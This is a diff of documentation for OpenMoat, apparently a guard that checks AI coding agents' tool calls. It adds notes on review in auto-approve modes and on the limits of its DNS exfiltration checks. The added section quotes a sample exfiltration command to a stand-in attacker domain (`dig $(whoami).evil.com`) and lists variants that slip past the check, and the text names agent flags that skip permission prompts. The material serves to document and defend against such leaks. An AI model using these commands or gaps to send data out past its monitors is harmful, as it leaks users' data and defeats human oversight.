@@ -19,9 +19,11 @@ Each agent's gaps and the reasons are in
 - **A deferred call runs if your agent lets it.** In auto-approve modes
   (`--dangerously-skip-permissions`, Run Everything) only `deny` and `review` stop a call.
   `unattended: review` in your policy holds those calls for review where the hook can see
-  the mode (Claude Code's `bypassPermissions` and `auto`, pi without a screen, Hermes Agent
-  in YOLO mode, Antigravity CLI's `always-proceed`; POLICY.md §5.4, ADR-100). It is off by
-  default. Cline's `--auto-approve`, OpenCode 2's `--auto`, Codex's approval policy
+  the mode (Claude Code's `bypassPermissions` and `auto`, and `acceptEdits` for edits and
+  file commands; pi without a screen, Hermes Agent in YOLO mode, Antigravity CLI's
+  `always-proceed`; POLICY.md §5.4, ADR-102). It is off by default. In `auto` and
+  `acceptEdits` the review is Claude Code's prompt, so it holds only while someone answers
+  it; elsewhere it is a deny until you approve it. Cline's `--auto-approve`, OpenCode 2's `--auto`, Codex's approval policy
   `never`, Gemini CLI's `--yolo` and GitHub Copilot CLI's `--allow-all-tools` are not
   shown to the hook, so a deferred call still runs there; use `openmoat run`.
 - **Some agents cannot prompt.** Codex, OpenCode 1, goose, the Cline CLI (where the deny
@@ -322,6 +324,18 @@ rest of each agent's protection on each OS, with the runs that back them.
   usually runs.
 
 ## Limits of single checks
+
+- **DNS exfiltration is seen only in a name with a fixed domain.** A name a resolver or
+  client looks up that is built at run time is decided as the domain it ends in
+  (`dig $(whoami).evil.com` is denied for an unlisted domain, ADR-102). Not seen: a name
+  with nothing fixed after its last expansion (`dig "$DOMAIN"`, `dig $(cat host.txt)`); a
+  domain under a top-level domain OpenMoat does not know, which is not taken for a host; a
+  host assigned to a variable earlier and used whole (`H=x.evil.com; dig $H`); a lookup
+  made by code that builds the name (`python3 -c` with a computed name, a script, a
+  program). The OS layers decide those where they apply. `getent`, `drill`, `kdig`,
+  `delv` and `resolvectl` now name hosts as `dig` does, so a lookup of an internal name
+  under a known top-level domain (`getent hosts db.corp.internal`) is decided as a
+  connection to it and denied unless the policy allows that host.
 
 - **After an upgrade, a policy edit or a move to another project, a long session's
   first calls may be refused.** OpenMoat works out the session's taint from its earlier
